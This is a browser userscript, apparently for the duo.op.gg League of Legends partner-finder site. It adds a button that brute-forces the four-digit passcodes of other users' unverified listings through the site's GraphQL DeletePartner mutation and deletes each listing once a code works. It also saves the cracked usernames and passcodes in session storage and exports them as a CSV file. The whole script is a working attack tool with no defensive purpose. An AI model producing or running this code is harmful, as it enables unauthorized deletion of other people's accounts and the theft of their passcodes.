// ==UserScript==
// @name         Duo.gg bruteforce
// @namespace    https://github.com/HigorJardini/Manhattan-Project/
// @version      0.7
// @description  op.gg
// @author       You
// @match        *://duo.op.gg/*/lol/
// @icon         https://www.google.com/s2/favicons?sz=64&domain=op.gg
// @grant        GM_log
// @grant        GM_addStyle
// @require      http://code.jquery.com/jquery-latest.js
// @require      http://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js
// @require      https://cdn.jsdelivr.net/npm/sweetalert2@11
// @require      https://use.fontawesome.com/0ded963fd5.js
// @run-at       document-idle
// ==/UserScript==

(function() {
  'use strict';

//--- Style our newly added elements using CSS.
GM_addStyle ( `
  #myContainer {
      position:               absolute;
      top:                    0;
      left:                   0;
      font-size:              20px;
      background:             #302c34;
      border:                 3px outset black;
      margin:                 5px;
      opacity:                0.9;
      z-index:                1100;
      padding:                5px 20px;
  }
  #myButton {
      cursor:                 pointer;
  }
  #myContainer p {
      color:                  red;
      background:             white;
  }
  #myContainer{
      transform:translatex(803px) translatey(92px);
  }
` );

const Toast = Swal.mixin({
  toast: true,
  position: 'top-end',
  showConfirmButton: false,
  timer: 6000,
  timerProgressBar: true,
  didOpen: (toast) => {
      toast.addEventListener('mouseenter', Swal.stopTimer)
      toast.addEventListener('mouseleave', Swal.resumeTimer)
  }
})

$("#duo-container > div > section > div.flex.justify-between.items-start.lg\\:items-center > div.flex.i.max-w-full.min-w-0.tems-center.sm\\:flex-col.sm\\:items-start > div > div.relative").remove()
$("#duo-container > div > section > div.flex.justify-between.items-start.lg\\:items-center > div.flex.max-w-full.min-w-0.lg\\:space-x-2.sm\\:flex-col-reverse.sm\\:items-end.relative > div.flex > button").remove()
$("#duo-container > div > section > div.flex.justify-between.items-start.lg\\:items-center > div.flex.max-w-full.min-w-0.lg\\:space-x-2.sm\\:flex-col-reverse.sm\\:items-end.relative > div.flex").append("<button id='myButton' class='rounded text-bold py-2.5 px-5 sm:px-4 sm:py-3.5 sm:text-3xs whitespace-nowrap text-white cursor-pointer' style='background-color: #e84057'><i class='fa fa-bomb' aria-hidden='true'></i></button>")
$("#duo-container > div > section > div.flex.justify-between.items-start.lg\\:items-center > div.flex.max-w-full.min-w-0.lg\\:space-x-2.sm\\:flex-col-reverse.sm\\:items-end.relative").append('<div class="sm:mt-2"><div class="flex" style="justify-content:center;position:relative"><button id="DownloadButton" class="rounded text-bold py-2.5 px-5 sm:px-4 sm:py-3.5 sm:text-3xs whitespace-nowrap text-white cursor-pointer" style="background-color: #5383e8"><i class="fa fa-download" aria-hidden="true"></i></button></div></div>')

document.getElementById ("myButton").addEventListener (
  "click", ButtonClickAction, false
);

document.getElementById ("DownloadButton").addEventListener (
  "click", downloadCsv, false
);

async function ButtonClickAction (zEvent) {
  $('.opgg-gnb-app').removeAttr('style');
  $('#myButton').css('background-color','#424254').prop("disabled",true);

  await Toast.fire({
      icon: 'warning',
      title: 'Iniciando a remoção...'
  })

  wipeDay();
}


function hasConsecutiveSequences(str) {
for (let i = 0; i < str.length - 3; i++) {
  const sequence = str.slice(i, i + 4);
  if (parseInt(sequence) === parseInt(sequence[0].repeat(4)) + 1) {
    return true;
  }
}
return false;
}

function hasRepeatingNumbers(str) {
for (let i = 0; i < str.length - 2; i++) {
  if (str[i] === str[i + 1] && str[i] === str[i + 2]) {
    return true;
  }
}
return false;
}

const numbersArray = [];

for (let i = 0; i <= 9999; i++) {
const paddedNumber = i.toString().padStart(4, '0');
if (!hasConsecutiveSequences(paddedNumber) && !hasRepeatingNumbers(paddedNumber)) {
  numbersArray.push(paddedNumber);
}
}

async function downloadCsv(){

var session = sessionStorage.getItem("deleted_accounts");
if (session != null){
  let deleted_accounts = JSON.parse(session)
  let csv = "data:text/csv;charset=utf-8," + deleted_accounts.map(e => e.join(",")).join("\n");
  var encoded = encodeURI(csv);
  var link = document.createElement("a");
  link.setAttribute("href", encoded);
  link.setAttribute("download", "Manhattan_Project.csv");
  document.body.appendChild(link); // Required for FF

  link.click();
} else {
  await Toast.fire({
        icon: 'info',
        title: 'Nenhuma informação disponível para download'
  })
}

}

async function sessionDeletedAccountsSaving(deleted_account) {
var session = sessionStorage.getItem("deleted_accounts");
var deleted_array;
if (session != null){
  deleted_array = JSON.parse(session);
  deleted_array.push(deleted_account);
  sessionStorage.removeItem('deleted_accounts');
} else {
    deleted_array = [];
    deleted_array.push(deleted_account);
}

sessionStorage.setItem("deleted_accounts", JSON.stringify(deleted_array));

}


var senhas = numbersArray;
var i;

async function saveUsersToDelete(ids) {
  var users = [];
  for(i = 0; i < ids.length; i++){
    let name = $(`#partner-${ids[i]} > div > div > div > a`).text();
    users.push([ids[i],name]);
  }
  return users
}

async function wipeDay(){

  var y = 0;
  const divs = document.querySelectorAll('[id^="partner-"].flex.items-center');
  const filteredDivs = Array.from(divs).filter(div => !div.textContent.includes("Verificado"));
  const numbers = Array.from(filteredDivs).map(div => div.id.match(/\d+/)[0]);
  const deleted_users = await saveUsersToDelete([...new Set(numbers)]);

  for(y = 0; y < deleted_users.length; y++){
   i = 0;
   var id   = deleted_users[y][0]
   var name = deleted_users[y][1];
   await Toast.fire({
        icon: 'info',
        title: 'Deletando o usuario: ' + name
   })
   await httpRequest(id, name);
  }

  $('#myButton').css('background-color','#e84057').prop("disabled",false);

  //console.clear();
  //console.log(deleted_accounts);
}

async function httpRequest(id, name) {

var found = false;
 //console.clear();
 //console.log('Processando... id: ' + id)
 $(`#partner-${id}`).css('background-color','#e84057');
 $(`#partner-${id} > div.w-24.flex.items-center.relative.text-3xs.text-center.py-2.px-2\\.5`).remove()
 $(`#partner-${id} > div.relative.flex.justify-center.items-center.w-8`).remove()
 $(`#patent-id-deleted-${id}`).remove()
 $(`#partner-${id}`).append(`<div id="patent-id-deleted-${id}" class="w-44 flex group items-center px-2.5 py-2 sm:whitespace-nowrap"><div class="min-w-0"><div class="flex items-center"><span id="patent-deleted-${id}" class="truncate text-2xs tracking-tight style="color:white" ></span><span class="flex items-center space-x-0.5 ml-1 group-hover:hidden"></span></div></div></div>`);


 while(found == false){

     let kboom = await TheBomb(id,senhas[i])
     let exists = $(`#partner-${id}`).length;

     if(kboom == false){
       if(i <= senhas.length && exists){
        i++;
        // console.clear();
        //console.log('Senhas testadas: ' + i + '/' + senhas.length + ' - (' + senhas[i] + ', ' + kboom + ') - Usuario: ' + name)
        $(`#patent-deleted-${id}`).text('Senhas testadas: ' + i + '/' + senhas.length);
       } else {
         found = true;
       }
     } else if (kboom == true) {
       //console.log('Senhas encontrada: ' + i + '/' + senhas.length + ' - (' + senhas[i] + ', ' + kboom + ') - Usuario: ' + name)
       var obj_deleted = [
                id,
                name,
                senhas[i]
              ]
       await sessionDeletedAccountsSaving(obj_deleted);

       await Toast.fire({
        icon: 'success',
        title: 'Usuario deletado: ' + name + ', senha: ' + senhas[i]
       })
     } else {
       await httpRequest(id,name);
     }
     found = kboom;
 }
}

async function TheBomb(id,pass){

  return fetch("https://duo.op.gg/graphql", {
    method: "POST",
    body: JSON.stringify( {
      "operationName": "DeletePartner",
      "variables": {
      "id": id,
      "passcode": pass
      },
      "query": "mutation DeletePartner($id: ID!, $passcode: String) {\n  deletePartner(id: $id, passcode: $passcode) {\n    id\n    __typename\n  }\n}"
    }),
    headers: { "Content-type" : "application/json" }
  }).then(response => response.json())
    .then(data => {
        //console.log(data)
        if(data.data != null){
          return true;
      } else {
          return false;
      }

    })
    .catch (e => {
      console.log(e)
      TheBomb(id,pass)
    })


}

})();